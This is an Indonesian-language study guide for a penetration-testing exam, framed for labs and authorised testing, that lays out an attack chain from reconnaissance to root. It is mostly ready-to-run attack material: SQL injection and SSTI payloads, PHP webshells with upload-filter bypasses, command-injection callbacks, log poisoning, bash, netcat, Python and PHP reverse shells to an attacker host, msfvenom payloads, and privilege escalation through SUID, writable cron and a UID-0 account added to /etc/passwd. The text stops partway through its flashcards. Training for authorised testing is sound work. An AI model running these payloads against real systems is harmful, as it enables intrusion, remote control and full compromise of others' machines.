# Cyber Kill Chain untuk Ujian Pentester
> **Ringkasan belajar berbasis repositori `w4h4z/Pentest-Cheat-Sheet`**  
> Fokus: laboratorium/CTF dan pengujian keamanan yang telah memperoleh izin.

---

## 1. Tujuan Dokumen

Dokumen ini merangkum alur serangan praktis dari repositori:

```text
Recon → Initial Foothold → Reverse Shell → Enumeration
→ Privilege Escalation → Proof
```

Alur tersebut merupakan **attack chain praktis untuk penetration testing**, bukan salinan persis tujuh tahap *Lockheed Martin Cyber Kill Chain*. Untuk ujian pentester, alur ini lebih operasional karena langsung menghubungkan temuan, command, bukti, dan keputusan berikutnya.

### Rumus hafalan

```text
R-F-S-E-P-P
Recon → Foothold → Shell → Enumeration → Privilege Escalation → Proof
```

Versi bahasa Indonesia:

```text
Cari → Masuk → Sambung → Periksa → Naik Hak Akses → Buktikan
```

---

# 2. Peta Besar Attack Chain

| Fase | Pertanyaan Utama | Target Hasil |
|---|---|---|
| 1. Reconnaissance | Target hidup? Port dan layanan apa yang terbuka? | IP, port, versi layanan, endpoint |
| 2. Initial Foothold | Celah apa yang memberi command execution? | RCE/webshell sebagai user layanan |
| 3. Reverse Shell | Bagaimana memperoleh shell interaktif? | Koneksi target ke Kali |
| 4. Enumeration | Salah konfigurasi atau kelemahan lokal apa yang tersedia? | Jalur privilege escalation |
| 5. Privilege Escalation | Bagaimana menjadi root? | `uid=0` atau `euid=0` |
| 6. Proof | Apa bukti keberhasilan yang wajib dikumpulkan? | Output `id` dan `hostname` |

## Prinsip utama ujian

Jangan melakukan semua command secara acak. Gunakan pola:

```text
Temukan → Konfirmasi → Eksploitasi → Verifikasi → Dokumentasikan
```

Contoh:

```text
Temukan SUID → identifikasi binary → cek GTFOBins
→ jalankan payload sesuai binary → verifikasi dengan id
```

---

# 3. Fase 1 — Reconnaissance

## 3.1 Tujuan

Recon digunakan untuk:

- menemukan alamat IP target;
- mengetahui IP Kali untuk `LHOST`;
- menemukan seluruh port TCP;
- mengenali versi layanan;
- mencari direktori, panel admin, upload, backup, dan endpoint tersembunyi.

## 3.2 Network Discovery

```bash
sudo netdiscover -r 10.0.2.0/24
nmap -sn 10.0.2.0/24
```

Cek IP Kali:

```bash
ip a
ip route
hostname -I
```

### Yang harus dicatat

```text
TARGET = IP mesin target
LHOST = IP Kali yang dapat dijangkau target
```

Kesalahan umum adalah memasukkan IP NAT, VPN, atau interface yang salah sebagai `LHOST`.

---

## 3.3 Port Scanning

### Scan utama

```bash
nmap -sV -sC -p- <TARGET>
```

Arti opsi:

| Opsi | Fungsi |
|---|---|
| `-sV` | mendeteksi versi service |
| `-sC` | menjalankan default NSE scripts |
| `-p-` | memindai seluruh port TCP 1–65535 |

### Scan lebih cepat

```bash
nmap -sV -p- --min-rate 5000 <TARGET>
```

### Pola yang lebih sistematis

```bash
# Tahap 1: cari semua port
nmap -p- --min-rate 5000 -T4 <TARGET> -oN all-ports.txt

# Tahap 2: scan detail port yang ditemukan
nmap -sC -sV -p<PORT1,PORT2,PORT3> <TARGET> -oN service-scan.txt
```

### Interpretasi cepat

| Port | Kemungkinan Arah |
|---:|---|
| 21 | FTP: anonymous login, file, credential |
| 22 | SSH: credential/key reuse |
| 80/443/8000/8080/8081 | aplikasi web |
| 3306 | MySQL/MariaDB |
| 5432 | PostgreSQL |
| 8009 | Tomcat AJP |
| 8080/8081 | Tomcat atau aplikasi web alternatif |
| 10000 | Webmin atau panel administrasi |

> Port hanya petunjuk. Verifikasi berdasarkan banner dan hasil `-sV`.

---

## 3.4 Web Enumeration

```bash
dirsearch -u http://<TARGET>:<PORT>/
```

Alternatif:

```bash
feroxbuster \
  -u http://<TARGET>:<PORT>/ \
  -w /usr/share/wordlists/dirb/common.txt

dirb \
  http://<TARGET>:<PORT>/ \
  /usr/share/wordlists/dirb/common.txt
```

### Endpoint bernilai tinggi

```text
/admin
/administrator
/login
/upload
/uploads
/backup
/config
/api
/test
/dev
/robots.txt
/.git
/.env
```

### Setelah menemukan endpoint

1. Buka secara manual.
2. Periksa parameter GET/POST.
3. Periksa cookie dan session.
4. Coba input aneh sederhana.
5. Gunakan Burp Suite untuk menangkap request.
6. Pilih pengujian berdasarkan fungsi endpoint.

Contoh:

| Fungsi | Pengujian Awal |
|---|---|
| Login | SQL injection, default credential |
| Upload avatar/dokumen | unrestricted file upload |
| Pencarian/detail dengan `id=` | SQLi, LFI, IDOR |
| Ping/diagnostic | command injection |
| Template preview | SSTI |
| Parameter `page=`/`file=` | LFI/path traversal |

---

## 3.5 Checklist Recon

```text
[ ] Target hidup
[ ] TARGET dicatat
[ ] LHOST dicatat
[ ] Semua port TCP dipindai
[ ] Versi layanan dicatat
[ ] Web pada setiap port HTTP diperiksa
[ ] robots.txt diperiksa
[ ] Directory brute force dijalankan
[ ] Parameter GET/POST penting dicatat
[ ] Screenshot/hasil scan disimpan
```

---

# 4. Fase 2 — Initial Foothold

## 4.1 Tujuan

Initial foothold berarti memperoleh kemampuan awal menjalankan perintah pada target. User awal biasanya:

```text
www-data
apache
nginx
tomcat
```

Alur ideal:

```text
Deteksi kerentanan → konfirmasi aman dengan id
→ peroleh webshell/RCE → identifikasi user
```

---

## 4.2 SQL Injection

### A. Auth Bypass

Payload dasar pada login:

```text
' OR '1'='1'-- -
admin'-- -
') OR ('1'='1
```

### B. Boolean Detection

```text
?id=1 AND 1=1
?id=1 AND 1=2
```

Jika respons berbeda secara konsisten, parameter patut diuji lebih lanjut.

### C. SQLMap

Cari database:

```bash
sqlmap \
  -u "http://<TARGET>:<PORT>/page?id=1" \
  --batch --dbs
```

Cari tabel:

```bash
sqlmap \
  -u "http://<TARGET>:<PORT>/page?id=1" \
  --batch -D <DATABASE> --tables
```

Dump tabel:

```bash
sqlmap \
  -u "http://<TARGET>:<PORT>/page?id=1" \
  --batch -D <DATABASE> -T users --dump
```

### D. Request POST dari Burp

Simpan request Burp sebagai `request.txt`, lalu:

```bash
sqlmap -r request.txt --batch --dbs
```

### Keputusan setelah SQLi

```text
SQLi ditemukan
├─ Ada credential? → login aplikasi/SSH
├─ Ada hash? → crack offline
├─ Ada FILE privilege + webroot writable? → tulis webshell
└─ Tidak ada jalur RCE? → gunakan data sebagai pivot
```

### Bukti minimal

```text
- parameter vulnerable;
- payload true/false;
- nama DB atau tabel;
- credential/hash yang diperoleh;
- hasil login atau RCE.
```

---

## 4.3 Unrestricted File Upload

### Webshell PHP paling sederhana

```php
<?php system($_GET['cmd']); ?>
```

Alternatif:

```php
<?php echo shell_exec($_GET['cmd']); ?>
```

### Variasi ekstensi

```text
shell.php
shell.phtml
shell.php5
shell.phar
shell.php.jpg
shell.jpg.php
shell.pHp
```

### Bypass Content-Type

Di Burp Suite, ubah:

```http
Content-Type: image/jpeg
```

Isi file tetap PHP.

### Bypass magic byte sederhana

Tambahkan pada awal file:

```text
GIF89a;
```

Contoh:

```php
GIF89a;
<?php system($_GET['cmd']); ?>
```

### Uji webshell

```bash
curl \
  "http://<TARGET>:<PORT>/uploads/shell.php?cmd=id"
```

### Decision tree upload

```text
File berhasil diunggah?
├─ Tidak → periksa extension, MIME, filename, magic byte
└─ Ya
   ├─ Lokasi file diketahui? → akses langsung
   └─ Tidak → enum /uploads, response upload, source HTML

File dapat diakses?
├─ Source PHP tampil → server tidak mengeksekusi PHP di folder itu
├─ 403 → permission/rule server
├─ 404 → path atau filename berubah
└─ Output id tampil → RCE berhasil
```

---

## 4.4 Command Injection

### Separator dasar

```text
; id
| id
|| id
& id
&& id
`id`
$(id)
%0a id
```

### Deteksi blind

```text
; sleep 5
```

Jika respons terlambat mendekati lima detik secara konsisten, ada indikasi command injection.

Callback HTTP:

```text
; curl http://<LHOST>/$(whoami)
```

Jalankan server di Kali:

```bash
python3 -m http.server 8000
```

### Urutan pengujian

```text
1. Uji separator dengan id
2. Uji sleep jika output tidak terlihat
3. Konfirmasi callback HTTP/DNS
4. Jalankan reverse shell
```

---

## 4.5 SSTI — Server-Side Template Injection

### Deteksi lintas template engine

```text
{{7*7}}
${7*7}
#{7*7}
<%= 7*7 %>
```

Jika aplikasi menampilkan `49`, ekspresi diproses oleh template engine.

### Jinja2/Flask — konfirmasi RCE

```text
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

Alternatif:

```text
{{ lipsum.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
```

### Tahapan

```text
Input direfleksikan
→ ekspresi matematika dievaluasi
→ identifikasi template engine
→ konfirmasi command execution dengan id
→ reverse shell
```

---

## 4.6 LFI dan Path Traversal

### Path traversal dasar

```text
?page=../../../../etc/passwd
?page=....//....//....//etc/passwd
```

Null byte hanya relevan pada lingkungan lama:

```text
?page=../../../../etc/passwd%00
```

### PHP wrapper untuk membaca source

```text
?page=php://filter/convert.base64-encode/resource=index.php
```

Decode:

```bash
echo '<BASE64>' | base64 -d
```

### File penting untuk dibaca

```text
/etc/passwd
/etc/hosts
/proc/self/environ
/var/www/html/config.php
/var/www/html/.env
/home/<USER>/.ssh/id_rsa
```

### LFI menuju RCE melalui log poisoning

Lokasi umum:

```text
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log
```

Inject PHP melalui User-Agent:

```bash
curl \
  -A "<?php system(\$_GET['cmd']); ?>" \
  http://<TARGET>/
```

Include log dan eksekusi:

```text
http://<TARGET>/vuln.php?page=/var/log/apache2/access.log&cmd=id
```

### Syarat log poisoning

```text
[ ] Payload tercatat di log
[ ] User web dapat membaca log
[ ] File log diproses sebagai PHP melalui LFI
[ ] Parameter command tidak difilter
```

---

## 4.7 Checklist Initial Foothold

```text
[ ] Kerentanan dikonfirmasi
[ ] Payload sederhana menghasilkan perubahan/output
[ ] Command id berhasil
[ ] User layanan diketahui
[ ] Working directory diketahui
[ ] Metode menuju reverse shell dipilih
[ ] Request eksploit disimpan
```

---

# 5. Fase 3 — Reverse Shell

## 5.1 Konsep

- **Kali** membuka listener.
- **Target** melakukan koneksi keluar menuju Kali.
- `LHOST` harus IP Kali yang dapat dijangkau target.
- `LPORT` harus sama pada listener dan payload.

Diagram:

```text
Kali: nc -lvnp 4444
          ▲
          │ koneksi dari target
          │
Target: bash/python/php reverse shell
```

---

## 5.2 Jalankan Listener Terlebih Dahulu

```bash
nc -lvnp 4444
```

Dengan command history:

```bash
rlwrap nc -lvnp 4444
```

Urutan wajib:

```text
1. Tentukan LHOST
2. Jalankan listener
3. Trigger payload
4. Jangan menutup terminal listener
```

---

## 5.3 Payload Bash

```bash
bash -i >& /dev/tcp/<LHOST>/4444 0>&1
```

Jika dipanggil melalui command injection:

```bash
bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'
```

URL-encoded:

```text
bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/<LHOST>/4444%200>%261'
```

---

## 5.4 Payload Netcat

Jika mendukung `-e`:

```bash
nc -e /bin/bash <LHOST> 4444
```

Fallback FIFO:

```bash
rm /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <LHOST> 4444 > /tmp/f
```

One-liner:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> 4444 >/tmp/f
```

---

## 5.5 Payload Python

```bash
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<LHOST>",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'
```

---

## 5.6 Payload PHP

```bash
php -r '$s=fsockopen("<LHOST>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

## 5.7 Msfvenom

### WAR untuk Tomcat

```bash
msfvenom \
  -p java/jsp_shell_reverse_tcp \
  LHOST=<LHOST> \
  LPORT=4444 \
  -f war \
  -o shell.war
```

### PHP

```bash
msfvenom \
  -p php/reverse_php \
  LHOST=<LHOST> \
  LPORT=4444 \
  -f raw \
  -o shell.php
```

### ELF Linux

```bash
msfvenom \
  -p linux/x64/shell_reverse_tcp \
  LHOST=<LHOST> \
  LPORT=4444 \
  -f elf \
  -o shell.elf

chmod +x shell.elf
```

---

## 5.8 Troubleshooting Reverse Shell

### Tidak ada koneksi

```text
[ ] Listener sudah aktif?
[ ] LHOST benar?
[ ] LPORT sama?
[ ] Target dapat ping/akses Kali?
[ ] Firewall memblokir?
[ ] Payload ter-encode atau dipotong?
[ ] Binary bash/nc/python/php tersedia?
```

Cek konektivitas dari target:

```bash
curl http://<LHOST>:8000/
```

Di Kali:

```bash
python3 -m http.server 8000
```

### Payload Bash gagal

Coba eksplisit:

```bash
/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'
```

Atau gunakan Python/Netcat/PHP.

---

# 6. Menstabilkan TTY

## 6.1 Mengapa perlu?

Shell awal sering tidak mendukung:

- `Ctrl+C`;
- autocomplete;
- command history;
- `clear`;
- program interaktif;
- `su`;
- editor terminal.

## 6.2 Cara cepat

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Alternatif:

```bash
script -qc /bin/bash /dev/null
/bin/sh -i
perl -e 'exec "/bin/sh";'
```

## 6.3 Upgrade TTY yang lebih lengkap

Pada target:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Tekan:

```text
Ctrl+Z
```

Pada Kali:

```bash
stty raw -echo; fg
```

Tekan Enter, lalu pada target:

```bash
export TERM=xterm
stty rows 40 columns 120
```

Untuk mengembalikan terminal Kali jika rusak:

```bash
reset
```

---

# 7. Fase 4 — Enumeration

## 7.1 Tujuan

Enumeration bukan sekadar mengumpulkan informasi. Tujuannya adalah menjawab:

```text
Apa yang dapat dijalankan sebagai root?
Apa yang dapat saya ubah?
Credential apa yang bocor?
Kernel atau service apa yang rentan?
```

## 7.2 Lima Quick Wins Pertama

Jalankan segera setelah memperoleh shell:

```bash
id
sudo -l
uname -a
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
```

Kemudian:

```bash
cat /etc/crontab
ls -la /etc/cron.d/
```

---

## 7.3 Identitas dan Sistem

```bash
id
whoami
hostname
uname -a
uname -r
cat /etc/os-release
```

Catat:

```text
- user dan group;
- distribusi Linux;
- versi kernel;
- hostname;
- arsitektur.
```

---

## 7.4 Sudo Rights

```bash
sudo -l
```

Cari:

```text
NOPASSWD
ALL
binary tertentu
wildcard
environment variable
LD_PRELOAD
```

Jika menemukan binary:

```text
cek GTFOBins → bagian Sudo
```

---

## 7.5 SUID dan SGID

SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
```

SGID:

```bash
find / -perm -2000 -type f 2>/dev/null
```

Prioritaskan binary tidak lazim pada:

```text
/usr/local/bin
/opt
/home
/tmp
```

Binary umum yang perlu dicek di GTFOBins:

```text
find
vim
less
awk
env
python
perl
bash
tar
nano
cp
dd
```

---

## 7.6 Linux Capabilities

```bash
getcap -r / 2>/dev/null
```

Temuan bernilai tinggi:

```text
cap_setuid
cap_dac_read_search
cap_dac_override
cap_sys_admin
```

Contoh pola berbahaya:

```text
/usr/bin/python3 cap_setuid=ep
```

Verifikasi di GTFOBins berdasarkan binary dan capability.

---

## 7.7 Cron Jobs

```bash
cat /etc/crontab
ls -la /etc/cron.d/
cat /etc/cron.d/*
```

Periksa:

- job dijalankan sebagai root;
- script yang dipanggil;
- permission script;
- permission direktori;
- command tanpa full path;
- wildcard;
- file konfigurasi yang writable.

---

## 7.8 Writable Files

```bash
find / -writable -type f 2>/dev/null | grep -v proc
```

Untuk file tertentu:

```bash
ls -la <FILE>
stat <FILE>
namei -l <FILE>
```

`namei -l` penting untuk mengecek permission pada seluruh komponen path.

---

## 7.9 Credential Hunting

```bash
ls -la /home/*
cat ~/.bash_history
find / -name "*.conf" 2>/dev/null
find / -name "*.ini" 2>/dev/null
find / -name "*.env" 2>/dev/null
find / -name "config.php" 2>/dev/null
```

Cari keyword:

```bash
grep -RniE \
  'password|passwd|secret|token|username|user=' \
  /var/www /opt /home 2>/dev/null
```

SSH keys:

```bash
find /home -name id_rsa -o -name authorized_keys 2>/dev/null
```

---

## 7.10 Internal Services

```bash
ss -tlnp
```

Alternatif:

```bash
netstat -tulnp 2>/dev/null
```

Service yang hanya listen di localhost dapat menjadi jalur pivot:

```text
127.0.0.1:3306
127.0.0.1:5432
127.0.0.1:8000
127.0.0.1:10000
```

---

## 7.11 LinPEAS

### Transfer dari Kali

Di Kali:

```bash
python3 -m http.server 8089
```

Di target:

```bash
wget \
  http://<LHOST>:8089/linpeas.sh \
  -O /tmp/linpeas.sh

chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/linpeas-output.txt
```

Alternatif langsung:

```bash
curl http://<LHOST>:8089/linpeas.sh | sh
```

### Cara membaca hasil

Prioritaskan:

1. sudo;
2. SUID;
3. capabilities;
4. cron/script writable;
5. credential;
6. service lokal;
7. kernel;
8. file sensitif readable/writable.

> Jangan menganggap semua teks merah berarti pasti exploitable. Konfirmasi manual.

---

## 7.12 Checklist Enumeration

```text
[ ] id dan group
[ ] sudo -l
[ ] OS dan kernel
[ ] SUID
[ ] SGID
[ ] capabilities
[ ] cron
[ ] file writable
[ ] credential dan history
[ ] SSH key
[ ] service internal
[ ] LinPEAS
[ ] setiap temuan dikonfirmasi manual
```

---

# 8. Fase 5 — Privilege Escalation

## 8.1 Prioritas Jalur

Gunakan urutan yang paling aman dan sederhana:

```text
1. Credential reuse
2. sudo misconfiguration
3. SUID/capabilities
4. Writable cron atau service script
5. Weak file permission
6. Kernel exploit
```

Kernel exploit sebaiknya menjadi pilihan terakhir karena risiko crash dan ketergantungan versi/patch.

---

## 8.2 Sudo Misconfiguration

Cek:

```bash
sudo -l
```

Contoh pola:

```bash
sudo env /bin/sh
```

```bash
sudo find . -exec /bin/sh \; -quit
```

```bash
sudo python3 -c 'import os;os.system("/bin/sh")'
```

Vim:

```bash
sudo vim -c ':!/bin/sh'
```

Less:

```bash
sudo less /etc/profile
```

Di dalam `less`:

```text
!/bin/sh
```

Setelah shell:

```bash
id
```

> Untuk setiap binary dari `sudo -l`, cari nama binary di GTFOBins dan gunakan bagian **Sudo**.

---

## 8.3 SUID

Cari:

```bash
find / -perm -4000 -type f 2>/dev/null
```

Pola umum:

```bash
env /bin/sh -p
bash -p
find . -exec /bin/sh -p \; -quit
awk 'BEGIN{system("/bin/sh")}'
```

### Mengapa `-p` penting?

`-p` mempertahankan effective UID. Tanpanya, shell dapat menurunkan privilege.

Verifikasi:

```bash
id
```

Hasil yang dapat diterima:

```text
uid=<USER> euid=0(root)
```

atau:

```text
uid=0(root)
```

---

## 8.4 Capabilities

Cek:

```bash
getcap -r / 2>/dev/null
```

Contoh jika Python mempunyai `cap_setuid=ep`:

```bash
python3 -c 'import os;os.setuid(0);os.execl("/bin/bash","bash","-p")'
```

Verifikasi:

```bash
id
```

---

## 8.5 Writable Cron

### Identifikasi

```bash
cat /etc/crontab
ls -la /etc/cron.d/
cat /etc/cron.d/*
```

Cek script:

```bash
ls -la /path/to/script.sh
stat /path/to/script.sh
```

### Payload SUID Bash

```bash
echo \
  'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' \
  >> /path/to/script.sh
```

Setelah cron berjalan:

```bash
/tmp/rootbash -p
id
```

### Hal yang perlu diperiksa

```text
[ ] Job dijalankan root
[ ] File script writable oleh user/group kita
[ ] Direktori tidak mencegah modifikasi
[ ] Cron benar-benar aktif
[ ] Script benar-benar dieksekusi
```

### PATH Hijacking

Berpotensi terjadi jika script root memanggil command tanpa full path:

```bash
tar
cp
backup
```

dan environment `PATH` mengarah lebih dahulu ke direktori writable.

---

## 8.6 Weak File Permission

### File sensitif

```bash
ls -la \
  /etc/passwd \
  /etc/shadow \
  /etc/sudoers \
  /etc/sudoers.d/
```

### `/etc/passwd` writable

Generate password hash:

```bash
openssl passwd -1 pass123
```

Tambahkan akun UID 0 hanya pada lab yang diizinkan:

```bash
echo \
  'labroot:<HASH>:0:0:root:/root:/bin/bash' \
  >> /etc/passwd
```

Login:

```bash
su labroot
id
```

### `/etc/shadow` readable

Salin hash dan lakukan cracking **offline** dengan John atau Hashcat sesuai jenis hash.

### `/etc/sudoers.d/` writable

Konsep salah konfigurasi:

```text
<USER> ALL=(ALL) NOPASSWD: ALL
```

Setelah konfigurasi valid:

```bash
sudo -i
id
```

### SSH private key readable

```bash
cat /home/<USER>/.ssh/id_rsa
```

Simpan di Kali:

```bash
chmod 600 id_rsa
ssh -i id_rsa <USER>@<TARGET>
```

---

## 8.7 Kernel Local Privilege Escalation

### Pemeriksaan awal

```bash
uname -r
cat /etc/os-release
```

Cari kandidat:

```bash
searchsploit linux kernel <VERSION>
```

Linux Exploit Suggester dapat membantu menyusun kandidat berdasarkan versi kernel.

### Aturan penting

```text
1. Jangan hanya mencocokkan nomor kernel.
2. Periksa distribusi dan patch/backport.
3. Baca source exploit sebelum compile.
4. Gunakan PoC dari sumber tepercaya.
5. Compile di target jika memungkinkan.
6. Kernel exploit adalah pilihan terakhir.
7. Siapkan snapshot lab.
```

Repositori sumber mencantumkan contoh CVE modern dan exploit kernel. Karena status kerentanan dapat berubah serta distribusi dapat melakukan backport patch, **selalu verifikasi CVE, versi paket, dan advisori vendor sebelum menjalankannya**.

---

## 8.8 Decision Tree Privilege Escalation

```text
sudo -l menghasilkan binary?
├─ Ya → cek GTFOBins/Sudo → exploit → id
└─ Tidak
   │
   ├─ Ada SUID tidak lazim?
   │  ├─ Ya → cek GTFOBins/SUID → gunakan -p → id
   │  └─ Tidak
   │
   ├─ Ada capability berbahaya?
   │  ├─ Ya → cek GTFOBins/Capabilities → id
   │  └─ Tidak
   │
   ├─ Ada cron root?
   │  ├─ Script writable → inject payload → tunggu → id
   │  ├─ PATH hijack → buat binary palsu → id
   │  └─ Tidak writable → lanjut
   │
   ├─ Ada credential/key?
   │  ├─ Ya → su/ssh → enum ulang sebagai user baru
   │  └─ Tidak
   │
   ├─ File sensitif writable/readable?
   │  ├─ Ya → eksploit sesuai file → id
   │  └─ Tidak
   │
   └─ Kernel vulnerable?
      ├─ Terkonfirmasi → snapshot → exploit → id
      └─ Tidak → ulangi enum lebih dalam
```

---

# 9. Fase 6 — Proof dan Submission

## 9.1 Bukti minimal

```bash
id
hostname
```

Idealnya tambahkan:

```bash
whoami
pwd
date
```

### Output yang dicari

```text
uid=0(root)
```

atau:

```text
euid=0(root)
```

dan nama host target.

## 9.2 Dokumentasi

Simpan:

```text
1. Command yang digunakan
2. Output command
3. Screenshot terminal
4. IP target
5. Hostname
6. User awal
7. Jalur privilege escalation
8. Bukti root
```

## 9.3 Jangan lupa

- jangan menampilkan terminal Kali saja;
- pastikan hostname terlihat;
- pastikan output `id` tidak terpotong;
- dokumentasikan user sebelum dan sesudah escalation;
- jangan menghapus bukti sebelum submission.

---

# 10. End-to-End Workflow untuk Ujian

## 10.1 Versi Lengkap

```bash
# =========================================================
# 1. DISCOVER
# =========================================================
sudo netdiscover -r 192.168.56.0/24
nmap -sn 192.168.56.0/24
hostname -I

# =========================================================
# 2. SCAN
# =========================================================
nmap -p- --min-rate 5000 -T4 <TARGET> -oN all-ports.txt
nmap -sC -sV -p<PORTS> <TARGET> -oN service-scan.txt

# =========================================================
# 3. WEB ENUM
# =========================================================
dirsearch -u http://<TARGET>:<PORT>/
feroxbuster \
  -u http://<TARGET>:<PORT>/ \
  -w /usr/share/wordlists/dirb/common.txt

# =========================================================
# 4. TEST FOOTHOLD
# =========================================================
# SQLi: ' OR '1'='1'-- -
# LFI:  ../../../../etc/passwd
# SSTI: {{7*7}}
# CMDi: ; id
# Upload: <?php system($_GET['cmd']); ?>

# =========================================================
# 5. LISTENER
# =========================================================
rlwrap nc -lvnp 4444

# =========================================================
# 6. REVERSE SHELL
# =========================================================
bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'

# =========================================================
# 7. STABILIZE
# =========================================================
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm

# =========================================================
# 8. ENUM
# =========================================================
id
sudo -l
uname -a
cat /etc/os-release
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab
ls -la /etc/cron.d/
find / -writable -type f 2>/dev/null | grep -v proc
ss -tlnp

# =========================================================
# 9. AUTOMATED ENUM
# =========================================================
wget http://<LHOST>:8089/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/linpeas-output.txt

# =========================================================
# 10. PRIVESC
# =========================================================
# pilih berdasarkan temuan:
# sudo → SUID → capabilities → cron → weak permission → kernel

# =========================================================
# 11. PROOF
# =========================================================
id
hostname
```

---

## 10.2 Versi Closed-Book 60 Detik

```text
1. IP:
   netdiscover / nmap -sn

2. Port:
   nmap -sC -sV -p- TARGET

3. Web:
   dirsearch / feroxbuster

4. Test:
   SQLi  = ' OR '1'='1'-- -
   LFI   = ../../../../etc/passwd
   SSTI  = {{7*7}}
   CMDi  = ; id
   Upload= PHP webshell

5. Shell:
   nc -lvnp 4444
   bash -c 'bash -i >& /dev/tcp/LHOST/4444 0>&1'

6. Stabil:
   python3 -c 'import pty;pty.spawn("/bin/bash")'

7. Enum:
   id
   sudo -l
   uname -a
   find SUID
   getcap
   cron
   writable
   ss -tlnp
   linpeas

8. Root:
   GTFOBins / cron / capability / credential / kernel

9. Bukti:
   id
   hostname
```

---

# 11. Matriks Temuan → Tindakan

| Temuan | Command Konfirmasi | Tindakan Berikutnya |
|---|---|---|
| Login form | tangkap POST di Burp | SQLi/default credential |
| Parameter `id=` | true/false test | SQLMap/manual SQLi |
| Upload | upload file harmless dahulu | uji extension/MIME/webshell |
| Parameter `page=` | baca `/etc/passwd` | source disclosure/log poisoning |
| Input diagnostic | `; id` atau `sleep 5` | reverse shell |
| Template input | `{{7*7}}` | identifikasi engine/RCE |
| Shell `www-data` | `id; sudo -l` | local enum |
| `NOPASSWD` | cek binary | GTFOBins Sudo |
| SUID custom | `ls -la`, `file`, `strings` | GTFOBins/source review |
| `cap_setuid` | `getcap` | payload capability |
| Cron root | permission script/path | writable script/PATH hijack |
| Credential config | login/su/ssh | enum ulang sebagai user baru |
| Kernel lama | version + vendor patch | verifikasi CVE/PoC |
| Root | `id; hostname` | screenshot dan submission |

---

# 12. Kesalahan yang Sering Terjadi Saat Ujian

## Recon

- hanya scan port umum, tidak memakai `-p-`;
- lupa memeriksa port web alternatif;
- tidak menyimpan hasil scan;
- wordlist tidak tersedia tetapi tidak mengganti path.

## Foothold

- langsung memakai payload kompleks tanpa deteksi sederhana;
- tidak menangkap request POST dengan Burp;
- tidak mencari lokasi file upload;
- menyimpulkan SQLi hanya dari satu respons;
- lupa melakukan URL encoding.

## Reverse Shell

- listener belum dijalankan;
- `LHOST` salah;
- port listener berbeda;
- target tidak dapat menjangkau Kali;
- payload rusak karena karakter `&`, `>`, atau quote.

## Enumeration

- hanya mengandalkan LinPEAS;
- melewatkan `sudo -l`;
- tidak mengecek capabilities;
- hanya melihat file, tidak mengecek permission direktori;
- tidak melakukan enum ulang setelah berpindah user.

## Privilege Escalation

- menjalankan kernel exploit terlalu cepat;
- menggunakan `bash` tanpa `-p` pada SUID;
- melihat cron tetapi tidak mengecek apakah script writable;
- tidak mengecek GTFOBins untuk setiap binary;
- tidak memverifikasi root dengan `id`.

## Submission

- screenshot tidak memuat hostname;
- output `id` menunjukkan user biasa;
- command dan output terpotong;
- tidak mencatat jalur eksploitasi.

---

# 13. Strategi Waktu Ujian

## Menit 0–15: Recon

```text
- temukan target;
- scan seluruh port;
- identifikasi layanan;
- mulai directory brute force.
```

## Menit 15–45: Foothold

```text
- prioritaskan endpoint login/upload/parameter;
- uji kerentanan sederhana;
- kejar command execution;
- peroleh reverse shell.
```

## Menit 45–75: Enumeration

```text
- quick wins manual;
- LinPEAS;
- analisis sudo/SUID/capability/cron/credential;
- pilih jalur termudah.
```

## Menit 75–105: Privilege Escalation

```text
- eksekusi jalur prioritas;
- verifikasi root;
- siapkan alternatif jika gagal.
```

## Menit 105–120: Proof

```text
- id;
- hostname;
- screenshot;
- rapikan catatan;
- pastikan bukti lengkap.
```

Sesuaikan dengan durasi ujian. Prinsipnya: jangan menghabiskan seluruh waktu pada satu payload yang tidak terkonfirmasi.

---

# 14. Template Catatan Ujian

````markdown
## Target

- IP:
- Port:
- Hostname:
- OS:
- Kernel:

## Services

| Port | Service | Version | Notes |
|---:|---|---|---|

## Web Enumeration

- URL:
- Endpoint:
- Parameter:
- Credential:
- Upload path:

## Initial Foothold

- Vulnerability:
- Detection payload:
- Exploit request:
- Initial user:

## Reverse Shell

- LHOST:
- LPORT:
- Payload:
- TTY stabilization:

## Privilege Escalation

- Finding:
- Verification:
- Exploit:
- Result:

## Proof

```bash
id
hostname
```
````

---

# 15. Flashcards Hafalan

## Q1 — Command menemukan semua port?

```bash
nmap -sV -sC -p- <TARGET>
```

## Q2 — Command directory brute force sederhana?

```bash
dirsearch -u http://<TARGET>:<PORT>/
```

## Q3 — Payload auth bypass dasar?

```text
' OR '1'='1'-- -
```

## Q4 — Deteksi LFI?

```text
?page=../../../../etc/passwd
```

## Q5 — Deteksi SSTI?

```text
{{7*7}}
```

## Q6 — Deteksi command injection?

```text
; id
```

## Q7 — PHP webshell sederhana?

```php
<?php system($_GET['cmd']); ?>
```

## Q8 — Listener?

```bash
nc -lvnp 4444
```

## Q9 — Bash reverse shell?

```bash
bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'
```

## Q10 — Stabilkan shell?

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

## Q11 — Cek sudo?

```bash
sudo -l
```

## Q12 — Cari SUID?

```bash
